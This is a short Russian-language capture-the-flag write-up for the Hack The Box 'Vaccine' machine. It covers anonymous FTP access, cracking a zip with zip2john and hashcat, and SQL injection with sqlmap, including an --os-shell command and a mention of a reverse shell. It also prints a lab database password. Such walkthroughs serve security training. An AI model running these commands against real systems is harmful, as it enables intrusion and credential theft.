@@ -1,0 +1,54 @@
+🎯 Машина: Vaccine (Very Easy)
+🔧 Категория: Linux
+
+— Что за машина —
+Коротко о чём задача, одно-два предложения.
+
+— Разведка —
+nmap -sC 10.129.14.110
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+|
+22/tcp open  ssh
+|
+80/tcp open  http
+
+Зашел на FTP без пароля под анонимом
+Забрал backup.zip, он был под паролем
+При помощи zip2john получил  хеш пароля от zip, вскрыл его при помощи hashcat и получил пароль от зипа
+
+В файле был файл с кодом аутентификации на сайт, 
+оттуда узнал какой логин и пароль в админку, но пароль надо было еще  вскрыть 
+
+
+— Эксплуатация —
+Зайдя в админку проверил 
+http://IP/dashboard.php?search=Pico
+На SQL инъекцию при помощи Sqlmap
+sqlmap -u "http://10.129.14.110/dashboard.php?search=test" --cookie="PHPSESSID=m79scunrjp9iopsf1uq138ve01"
+Оказалось, что Параметр search уязвим к нескольким типам инъекций — boolean-based, error-based, stacked queries, time-based.
+
+Далее запустил 
+sqlmap -u "http://10.129.14.110/dashboard.php?search=test" --cookie="PHPSESSID=m79scunrjp9iopsf1uq138ve01" --os-shell
+Войдя в консоль запустил реверс-шелл
+
+Я работал из под пользователя postgres 
+
+В файле /var/www/html/dashboard.php
+нашел пароль 
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!"
+С этими кредами можно попробовать ssh
+
+
+— Флаг —
+Нашел в домашней директории
+/var/lib/postgresql/user.txt
+
+— Что узнал —
+sqlmap нужна сессия через куки, чтобы тестить
+
+Можно получить Хэш пароля zip, через zip2john
+Такой способ работает для большинства защищённых форматов.
+
+#HTB #WEB #Linux #sqlmap #zip2john
